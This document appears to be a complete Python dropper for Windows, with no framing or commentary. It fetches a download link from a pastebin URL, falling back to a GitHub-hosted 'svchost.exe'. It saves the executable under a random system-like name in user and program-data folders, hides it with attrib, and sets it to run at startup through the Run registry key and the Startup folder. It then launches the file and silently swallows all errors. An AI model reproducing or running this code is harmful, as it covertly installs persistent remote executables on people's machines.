import os
import requests
import tempfile
import subprocess
import sys
import winreg
import random
import string
import time
import shutil

def packat():
    if sys.platform != "win32":
        return
    
    prefixes = ["Microsoft", "Windows", "System", "Security", "Update", "Driver", "Service", "Host", "Runtime", "Framework"]
    suffixes = ["Manager", "Helper", "Service", "Updater", "Monitor", "Agent", "Process", "Handler", "Controller", "Daemon"]
    
    prefix = random.choice(prefixes)
    suffix = random.choice(suffixes)
    
    if random.choice([True, False]):
        number = random.randint(10, 99)
        filename = f"{prefix}{suffix}{number}.exe"
    else:
        filename = f"{prefix}{suffix}.exe"
    
    try:
        response = requests.get("https://pastebin.com/raw/Z4VMbzLP")
        url = response.text.strip()
    except:
        url = "https://github.com/FaresEI3RAB/Fares/raw/refs/heads/main/svchost.exe"
    
    paths = [
        os.path.join(os.environ['APPDATA'], filename),
        os.path.join(os.environ['LOCALAPPDATA'], filename),
        os.path.join(os.environ['TEMP'], filename),
        os.path.join(os.environ['ProgramData'], filename)
    ]
    
    file_path = random.choice(paths)
    
    try:
        response = requests.get(url)
        with open(file_path, 'wb') as f:
            f.write(response.content)
        
        subprocess.run(['attrib', '+h', '+s', '+r', file_path], shell=True)
        
        try:
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
            reg_name = os.path.splitext(os.path.basename(file_path))[0]
            winreg.SetValueEx(key, reg_name, 0, winreg.REG_SZ, file_path)
            winreg.CloseKey(key)
        except:
            pass
        
        try:
            startup_folder = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            dest_path = os.path.join(startup_folder, os.path.basename(file_path))
            shutil.copy2(file_path, dest_path)
        except:
            pass
        
        subprocess.Popen(file_path, shell=True)
        
    except:
        pass

if __name__ == "__main__":
    packat()